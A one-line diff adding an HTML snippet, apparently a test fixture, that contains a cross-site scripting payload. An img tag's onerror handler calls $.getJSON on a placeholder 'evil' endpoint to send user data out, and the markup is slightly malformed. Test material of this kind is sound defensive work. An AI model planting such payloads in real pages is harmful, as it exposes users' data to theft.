@@ -1,0 +1,1 @@
+<p>Legen-wait-for-it-dary! <img src="foobar.jpg" onerror="$.getJSON('http://localhost:8080/evil?data=user data')/></p>
